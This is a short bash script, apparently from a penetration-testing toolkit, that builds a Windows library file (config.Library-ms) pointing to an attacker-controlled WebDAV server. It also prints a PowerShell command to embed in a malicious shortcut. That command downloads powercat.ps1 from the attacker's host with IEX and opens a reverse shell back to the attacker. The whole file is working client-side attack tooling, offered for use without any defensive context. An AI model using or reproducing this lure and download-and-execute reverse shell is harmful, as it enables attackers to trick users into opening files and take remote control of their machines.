#! /bin/bash

# This script generates a windows library file pointing towards your webdav server.
# This scripts prints reverse shell code to be injected in windows shortcut file.
# Useful for client-side attacks.
# By @gustanini

# Check if two arguments are provided
if [ $# -ne 4 ]; then
    echo "This script requires lhost and lport for Windows Library file and reverse shell."
    echo "Usage: $0 -l <lhost> -p <lport>"
    exit 1
fi

# Parse the arguments
while getopts "l:p:" opt; do
  case ${opt} in
    l )
      lhost=$OPTARG
      ;;
    p )
      lport=$OPTARG
      ;;
    \? )
      echo "Invalid option: $OPTARG" 1>&2
      ;;
    : )
      echo "Invalid option: $OPTARG requires an argument" 1>&2
      ;;
  esac
done

# Generate windows config.Library-ms using lhost for URL
cat << EOF > config.Library-ms
<?xml version=1.0 encoding=UTF-8?>
<libraryDescription xmlns=http://schemas.microsoft.com/windows/2009/library>
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://${lhost}/</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
EOF

# Print reverse shell code with lhost and lport
echo "File saved to ./config.Library-ms."

echo "Inject the following command in location field when creating shortcut file:"

echo "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://${lhost}:8000/powercat.ps1'); powercat -c ${lhost} -p ${lport} -e powershell\""
